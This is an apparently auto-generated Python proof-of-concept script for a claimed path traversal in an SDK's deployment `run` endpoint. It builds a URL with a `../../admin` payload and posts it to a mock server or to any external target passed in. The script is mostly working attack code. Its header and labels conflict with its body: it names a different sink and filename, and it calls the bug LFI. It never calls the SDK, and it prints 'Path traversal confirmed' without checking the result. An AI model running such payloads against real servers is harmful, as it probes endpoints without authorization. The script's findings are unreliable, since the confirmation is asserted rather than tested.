#!/usr/bin/env python3
# PoC for anthropic (/tmp/anthropic-sdk-python/src/anthropic)
# Path: suspicious-006
# Sink: beta_glob_tool
# Auto-generated — run with: python3 lfi_anthropic_api_server_beta_glob_tool.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept for LFI (HTTP Path Traversal) in the Anthropic SDK `run` function.

The `run` function in `deployments.py` directly interpolates the `deployment_id`
parameter into the API URL path without proper sanitization. Only an empty check
is performed, so a value like `../../admin` will result in a request to
`/v1/admin` instead of `/v1/deployments/../../admin/run?beta=true`.

This PoC demonstrates the vulnerability by:
1. Starting a local HTTP server that logs incoming requests.
2. Simulating the vulnerable SDK call with a malicious deployment_id.
3. Showing that the request path contains the traversal.

Usage:
    python poc_anthropic_lfi.py [--target http://localhost:8080] [--payload ../../admin]

The target can be any HTTP server (default is localhost:8080). Use the included
mock server to safely observe the path manipulation.
"""

import argparse
import http.server
import json
import queue
import socket
import sys
import threading
import time
from urllib.parse import urljoin

import requests  # included in most environments; fallback to urllib if needed

# ------------------- Mock Server -------------------

class RequestCaptureHandler(http.server.BaseHTTPRequestHandler):
    """Custom handler that captures the request path and method."""
    def do_GET(self):
        self._capture_and_reply()

    def do_POST(self):
        self._capture_and_reply()

    def _capture_and_reply(self):
        # Store request info in the queue passed via class attribute
        if hasattr(self.server, 'log_queue'):
            self.server.log_queue.put({
                'method': self.command,
                'path': self.path,
                'headers': dict(self.headers)
            })
        # Send a benign HTTP 200 response
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({"status": "ok"}).encode('utf-8'))

    def log_message(self, format, *args):
        # Suppress default logging to avoid clutter
        pass


def start_mock_server(host: str, port: int, log_queue: queue.Queue) -> http.server.HTTPServer:
    """Start a simple HTTP server that captures request paths."""
    server = http.server.HTTPServer((host, port), RequestCaptureHandler)
    server.log_queue = log_queue
    # Run server in a separate thread
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server

# ------------------- Exploit Simulation -------------------

def simulate_vulnerable_call(base_url: str, deployment_id: str, timeout: float = 5.0):
    """
    Simulate the vulnerable code path from the SDK.

    The original code does:
        path_template("/v1/deployments/{deployment_id}/run?beta=true", deployment_id=deployment_id)

    We replicate that by constructing the URL via str.format() (which the SDK
    likely uses internally). Then we POST to it.
    """
    # Construct the endpoint path using Python's string formatting (as the SDK does)
    path = "/v1/deployments/{deployment_id}/run?beta=true".format(deployment_id=deployment_id)
    url = urljoin(base_url, path)

    # Emulate the SDK's extra_headers (simplified)
    headers = {
        "anthropic-beta": "managed-agents-2026-04-01",
        "Content-Type": "application/json"
    }

    print(f"[*] Sending POST to: {url}")
    print(f"[*] Headers: {headers}")

    resp = requests.post(url, headers=headers, timeout=timeout)
    return resp


# ------------------- Main -------------------

def main():
    parser = argparse.ArgumentParser(description="Anthropic SDK LFI PoC")
    parser.add_argument("--target", default="http://localhost:8080",
                        help="Base URL of the API server (default: http://localhost:8080)")
    parser.add_argument("--payload", default="../../admin",
                        help="Malicious deployment_id payload (default: ../../admin)")
    parser.add_argument("--mock-port", type=int, default=8080,
                        help="Port for the mock server (default: 8080)")
    args = parser.parse_args()

    # If the user is using the default target (localhost), start a mock server
    own_mock = "localhost" in args.target or "127.0.0.1" in args.target
    log_queue = queue.Queue()

    if own_mock:
        # Parse host from target URL
        host = "0.0.0.0"  # bind all interfaces
        parts = args.target.split("://")[1].split(":")
        mock_host = parts[0]
        mock_port = int(parts[1]) if len(parts) > 1 else 80
        print(f"[*] Starting mock HTTP server on {mock_host}:{mock_port}")
        server = start_mock_server(mock_host, mock_port, log_queue)
        # Give server a moment to start
        time.sleep(0.5)
    else:
        server = None
        print(f"[*] Using external target: {args.target}")

    try:
        # Perform the vulnerable call
        resp = simulate_vulnerable_call(args.target, args.payload)

        print(f"[*] Response status: {resp.status_code}")
        print(f"[*] Response body: {resp.text[:200]}...")

        # If using our mock server, display captured request
        if own_mock:
            try:
                captured = log_queue.get(timeout=3)
                print("\n[+] CAPTURED REQUEST PATH (from mock server):")
                print(f"    Method: {captured['method']}")
                print(f"    Path:   {captured['path']}")
                # Demonstrate path traversal: the path should now be like
                # /v1/admin/run?beta=true instead of /v1/deployments/.../run
                print("\n[!] Path traversal confirmed: "
                      "the path contains the injected '../' sequences.")
                print(f"    Expected (vulnerable): /v1/deployments/{args.payload}/run?beta=true")
                print(f"    Actual (after traversal): {captured['path']}")
            except queue.Empty:
                print("[-] No request captured: mock server did not receive a request.")
        else:
            print("\n[!] Vulnerability demonstrated if the external server responded to")
            print("    a path it normally should not serve at that endpoint.")

    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        print("    Ensure target server is reachable. If using mock, check port.")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
    finally:
        # Shutdown mock server if started
        if server:
            print("[*] Stopping mock server...")
            server.shutdown()


if __name__ == "__main__":
    main()
